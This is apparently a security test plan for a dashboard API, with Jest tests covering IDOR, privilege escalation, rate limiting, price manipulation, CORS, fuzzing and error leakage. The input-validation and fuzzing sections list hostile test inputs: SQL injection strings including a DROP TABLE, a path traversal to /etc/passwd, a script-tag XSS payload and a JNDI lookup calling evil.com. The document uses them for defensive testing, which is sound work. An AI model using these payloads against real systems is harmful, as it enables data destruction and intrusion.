# Security Test Plan - KWS Dashboard PostgreSQL

## Overview

This test plan covers security testing for the KWS Dashboard application, focusing on OWASP Top 10 and API Security vulnerabilities, with emphasis on IDOR/BOLA, broken authentication, and business logic flaws.

---

## Test Environment Setup

### Prerequisites
- Node.js and npm installed
- PostgreSQL database running
- Test database seeded with test users and data
- API server running on `http://localhost:3001`

### Test Users
Create the following test users with different roles:

```typescript
const testUsers = {
  superAdmin: { id: 1, email: 'superadmin@test.com', roleId: 1, roleName: 'super_admin' },
  admin: { id: 2, email: 'admin@test.com', roleId: 2, roleName: 'admin' },
  teacher: { id: 3, email: 'teacher@test.com', roleId: 3, roleName: 'teacher' },
  regularUser: { id: 4, email: 'user@test.com', roleId: 4, roleName: 'user' },
  anotherUser: { id: 5, email: 'user2@test.com', roleId: 4, roleName: 'user' }
};
```

---

## Test Categories

### 1. Authentication & Authorization Tests

#### Test 1.1: IDOR - User Data Access
**Objective:** Verify users cannot access other users' data

```typescript
describe('IDOR Protection - User Data', () => {
  it('should deny regular user from viewing another user\'s profile', async () => {
    const user1Token = await loginUser(testUsers.regularUser);
    const user2 = await createTestUser();
    
    const response = await request(app)
      .get(`/api/users/${user2.id}`)
      .set('Authorization', `Bearer ${user1Token}`);
    
    expect(response.status).toBe(403);
    expect(response.body.message).toContain('Access denied');
  });

  it('should allow user to view their own profile', async () => {
    const userToken = await loginUser(testUsers.regularUser);
    
    const response = await request(app)
      .get(`/api/users/${testUsers.regularUser.id}`)
      .set('Authorization', `Bearer ${userToken}`);
    
    expect(response.status).toBe(200);
    expect(response.body.data.id).toBe(testUsers.regularUser.id);
  });

  it('should allow admin to view any user\'s profile', async () => {
    const adminToken = await loginUser(testUsers.admin);
    const regularUser = await createTestUser();
    
    const response = await request(app)
      .get(`/api/users/${regularUser.id}`)
      .set('Authorization', `Bearer ${adminToken}`);
    
    expect(response.status).toBe(200);
  });
});
```

#### Test 1.2: IDOR - User Update
**Objective:** Verify users cannot modify other users' data

```typescript
describe('IDOR Protection - User Update', () => {
  it('should deny regular user from updating another user\'s profile', async () => {
    const user1Token = await loginUser(testUsers.regularUser);
    const user2 = await createTestUser();
    
    const response = await request(app)
      .put(`/api/users/${user2.id}`)
      .set('Authorization', `Bearer ${user1Token}`)
      .send({ firstName: 'Hacked' });
    
    expect(response.status).toBe(403);
  });

  it('should prevent privilege escalation - user cannot change own role', async () => {
    const userToken = await loginUser(testUsers.regularUser);
    
    const response = await request(app)
      .put(`/api/users/${testUsers.regularUser.id}`)
      .set('Authorization', `Bearer ${userToken}`)
      .send({ roleId: 1 }); // Try to become super_admin
    
    expect(response.status).toBe(403);
    expect(response.body.message).toContain('cannot change your own role');
  });

  it('should prevent admin from demoting super_admin', async () => {
    const adminToken = await loginUser(testUsers.admin);
    
    const response = await request(app)
      .put(`/api/users/${testUsers.superAdmin.id}`)
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ roleId: 4 }); // Try to demote super_admin
    
    expect(response.status).toBe(403);
  });
});
```

#### Test 1.3: IDOR - Enrollment Access
**Objective:** Verify users cannot access other users' enrollments

```typescript
describe('IDOR Protection - Enrollments', () => {
  it('should deny user from viewing another user\'s enrollment', async () => {
    const user1Token = await loginUser(testUsers.regularUser);
    const user2 = await createTestUser();
    const enrollment = await createEnrollment({ userId: user2.id });
    
    const response = await request(app)
      .get(`/api/enrollments/${enrollment.id}`)
      .set('Authorization', `Bearer ${user1Token}`);
    
    expect(response.status).toBe(403);
  });

  it('should prevent payment status manipulation by regular users', async () => {
    const userToken = await loginUser(testUsers.regularUser);
    const enrollment = await createEnrollment({ userId: testUsers.regularUser.id });
    
    const response = await request(app)
      .put(`/api/enrollments/${enrollment.id}`)
      .set('Authorization', `Bearer ${userToken}`)
      .send({ paymentStatus: 'paid' }); // Try to mark as paid without payment
    
    expect(response.status).toBe(403);
    expect(response.body.message).toContain('Only administrators can change payment status');
  });

  it('should allow admin to change payment status', async () => {
    const adminToken = await loginUser(testUsers.admin);
    const enrollment = await createEnrollment({ userId: testUsers.regularUser.id });
    
    const response = await request(app)
      .put(`/api/enrollments/${enrollment.id}`)
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ paymentStatus: 'paid' });
    
    expect(response.status).toBe(200);
    expect(response.body.data.payment_status).toBe('paid');
  });
});
```

---

### 2. Permission System Tests

#### Test 2.1: Permission Enforcement
**Objective:** Verify permission system works correctly

```typescript
describe('Permission System', () => {
  it('should deny access when user lacks required permission', async () => {
    const userToken = await loginUser(testUsers.regularUser);
    
    // Assume regular user doesn't have 'users.delete' permission
    const response = await request(app)
      .delete(`/api/users/${testUsers.anotherUser.id}`)
      .set('Authorization', `Bearer ${userToken}`);
    
    expect(response.status).toBe(403);
  });

  it('should allow access when user has required permission', async () => {
    // Grant permission to user
    await grantPermission(testUsers.regularUser.roleId, 'users', 'view');
    const userToken = await loginUser(testUsers.regularUser);
    
    const response = await request(app)
      .get('/api/users')
      .set('Authorization', `Bearer ${userToken}`);
    
    expect(response.status).toBe(200);
  });

  it('should allow super_admin to bypass all permission checks', async () => {
    const superAdminToken = await loginUser(testUsers.superAdmin);
    
    const response = await request(app)
      .delete(`/api/users/${testUsers.regularUser.id}`)
      .set('Authorization', `Bearer ${superAdminToken}`);
    
    expect(response.status).toBe(200);
  });
});
```

---

### 3. Rate Limiting Tests

#### Test 3.1: Authentication Rate Limiting
**Objective:** Verify rate limiting on auth endpoints

```typescript
describe('Rate Limiting - Authentication', () => {
  it('should rate limit login attempts', async () => {
    const requests = Array(6).fill(null).map(() =>
      request(app)
        .post('/api/auth/login')
        .send({
          email: 'admin@test.com',
          password: 'wrongpassword'
        })
    );
    
    const responses = await Promise.all(requests);
    const rateLimited = responses.find(r => r.status === 429);
    
    expect(rateLimited).toBeDefined();
    expect(rateLimited?.body.message).toContain('Too many login attempts');
  });

  it('should not rate limit successful logins', async () => {
    // Make 5 successful logins (should not be rate limited)
    for (let i = 0; i < 5; i++) {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUsers.regularUser.email,
          password: 'correctpassword'
        });
      
      expect(response.status).toBe(200);
    }
  });
});
```

#### Test 3.2: General API Rate Limiting
**Objective:** Verify rate limiting on general endpoints

```typescript
describe('Rate Limiting - General API', () => {
  it('should rate limit after 100 requests', async () => {
    const token = await loginUser(testUsers.regularUser);
    const requests = Array(101).fill(null).map(() =>
      request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${token}`)
    );
    
    const responses = await Promise.all(requests);
    const rateLimited = responses.find(r => r.status === 429);
    
    expect(rateLimited).toBeDefined();
  });
});
```

---

### 4. Business Logic Tests

#### Test 4.1: Price Manipulation Prevention
**Objective:** Verify server-side price calculation

```typescript
describe('Business Logic - Price Calculation', () => {
  it('should use server-side prices for book sales, ignoring client prices', async () => {
    const book = await createBook({ salePrice: 100, costPrice: 50 });
    const adminToken = await loginUser(testUsers.admin);
    
    // Try to send manipulated low price
    const response = await request(app)
      .post('/api/v1/book-sales')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        soldAt: new Date().toISOString(),
        paymentMethod: 'CASH',
        items: [{
          bookId: book.id,
          qty: 1,
          unitPrice: 0.01  // Try to set very low price
        }]
      });
    
    expect(response.status).toBe(201);
    // Server should use book.salePrice (100), not client price (0.01)
    expect(response.body.data.totalAmount).toBe(100);
    expect(response.body.data.items[0].unitPrice).toBe(100);
  });

  it('should prevent selling inactive books', async () => {
    const book = await createBook({ salePrice: 100, isActive: false });
    const adminToken = await loginUser(testUsers.admin);
    
    const response = await request(app)
      .post('/api/v1/book-sales')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        soldAt: new Date().toISOString(),
        paymentMethod: 'CASH',
        items: [{ bookId: book.id, qty: 1, unitPrice: 100 }]
      });
    
    expect(response.status).toBe(400);
    expect(response.body.message).toContain('inactive');
  });
});
```

---

### 5. Input Validation Tests

#### Test 5.1: User Input Validation
**Objective:** Verify input validation prevents malicious data

```typescript
describe('Input Validation', () => {
  it('should reject invalid email format', async () => {
    const adminToken = await loginUser(testUsers.admin);
    
    const response = await request(app)
      .post('/api/users')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        email: 'not-an-email',
        password: 'ValidPass123!',
        roleId: 4
      });
    
    expect(response.status).toBe(400);
    expect(response.body.message).toContain('email');
  });

  it('should reject weak passwords', async () => {
    const adminToken = await loginUser(testUsers.admin);
    
    const weakPasswords = ['123', 'password', 'PASSWORD', 'Password1'];
    
    for (const password of weakPasswords) {
      const response = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          email: `test${Date.now()}@test.com`,
          password,
          roleId: 4
        });
      
      expect(response.status).toBe(400);
      expect(response.body.message).toContain('password');
    }
  });

  it('should reject SQL injection attempts in search queries', async () => {
    const token = await loginUser(testUsers.regularUser);
    
    const maliciousQueries = [
      "'; DROP TABLE users;--",
      "1' OR '1'='1",
      "admin'--"
    ];
    
    for (const query of maliciousQueries) {
      const response = await request(app)
        .get(`/api/users?q=${encodeURIComponent(query)}`)
        .set('Authorization', `Bearer ${token}`);
      
      // Should not crash, should return 200 with empty results or sanitized query
      expect([200, 400]).toContain(response.status);
    }
  });
});
```

---

### 6. CORS Tests

#### Test 6.1: CORS Configuration
**Objective:** Verify CORS is properly configured

```typescript
describe('CORS Configuration', () => {
  it('should allow requests from whitelisted origins', async () => {
    const response = await request(app)
      .options('/api/users')
      .set('Origin', 'https://adminkoreanwithus.netlify.app')
      .set('Access-Control-Request-Method', 'GET');
    
    expect(response.status).toBe(204);
    expect(response.headers['access-control-allow-origin']).toBe('https://adminkoreanwithus.netlify.app');
  });

  it('should reject requests from unauthorized origins in production', async () => {
    process.env.NODE_ENV = 'production';
    
    const response = await request(app)
      .options('/api/users')
      .set('Origin', 'https://evil.com')
      .set('Access-Control-Request-Method', 'GET');
    
    expect(response.status).toBe(403);
  });
});
```

---

### 7. Fuzz Testing

#### Test 7.1: Parameter Fuzzing
**Objective:** Test endpoints with various malicious inputs

```typescript
describe('Fuzz Testing', () => {
  const fuzzInputs = [
    null,
    undefined,
    '',
    ' ',
    'null',
    'undefined',
    -1,
    0,
    999999999,
    'abc',
    '../../etc/passwd',
    '<script>alert(1)</script>',
    '${jndi:ldap://evil.com/a}',
    '1 OR 1=1',
    '1; DROP TABLE users;--',
    'NaN',
    'Infinity',
    Array(10000).fill('a').join(''), // Very long string
    '\x00', // Null byte
    '%00', // URL encoded null byte
  ];

  it('should handle fuzzed user IDs safely', async () => {
    const token = await loginUser(testUsers.admin);
    
    for (const input of fuzzInputs) {
      const response = await request(app)
        .get(`/api/users/${input}`)
        .set('Authorization', `Bearer ${token}`);
      
      // Should not crash, should return 400 or 404
      expect([400, 404]).toContain(response.status);
    }
  });

  it('should handle fuzzed request bodies safely', async () => {
    const token = await loginUser(testUsers.admin);
    
    for (const input of fuzzInputs) {
      const response = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${token}`)
        .send({ email: input, password: input, roleId: input });
      
      // Should not crash, should return 400
      expect(response.status).toBe(400);
    }
  });
});
```

---

### 8. Error Handling Tests

#### Test 8.1: Information Disclosure
**Objective:** Verify error messages don't leak sensitive information

```typescript
describe('Error Handling', () => {
  it('should not expose stack traces in production', async () => {
    process.env.NODE_ENV = 'production';
    
    // Trigger an error
    const response = await request(app)
      .get('/api/users/invalid')
      .set('Authorization', 'Bearer invalid-token');
    
    expect(response.status).toBe(401);
    expect(response.body).not.toHaveProperty('stack');
    expect(response.body).not.toHaveProperty('error.stack');
  });

  it('should not expose database errors in production', async () => {
    process.env.NODE_ENV = 'production';
    
    // This might trigger a database error
    const response = await request(app)
      .post('/api/users')
      .set('Authorization', 'Bearer valid-token')
      .send({ email: null, password: null });
    
    expect(response.body.message).not.toContain('Prisma');
    expect(response.body.message).not.toContain('database');
    expect(response.body.message).not.toContain('SQL');
  });
});
```

---

## Test Execution

### Running Tests

```bash
# Install test dependencies
npm install --save-dev jest @types/jest supertest @types/supertest

# Run all security tests
npm run test:security

# Run specific test suite
npm run test:security -- --testNamePattern="IDOR Protection"

# Run with coverage
npm run test:security -- --coverage
```

### Continuous Integration

Add to `.github/workflows/security-tests.yml`:

```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-node@v2
        with:
          node-version: '18'
      - run: npm install
      - run: npm run test:security
```

---

## Expected Results

### Pass Criteria
- All IDOR tests must pass (users cannot access others' data)
- All permission tests must pass
- Rate limiting must work on all protected endpoints
- Business logic tests must prevent price manipulation
- Input validation must reject malicious inputs
- CORS must reject unauthorized origins in production
- Error messages must not leak sensitive information

### Fail Criteria
- Any test that allows unauthorized access should fail
- Any test that allows privilege escalation should fail
- Any test that allows price manipulation should fail
- Any test that exposes sensitive information should fail

---

## Test Maintenance

### Updating Tests
- Update test users when roles change
- Add new tests when new endpoints are added
- Update fuzz inputs based on new attack vectors
- Review and update tests quarterly

### Reporting
- Generate test reports after each run
- Track test coverage (aim for >80% on security-critical code)
- Document any vulnerabilities found
- Create tickets for failed tests

---

**Last Updated:** 2025-01-XX  
**Next Review:** After Phase 1 implementation

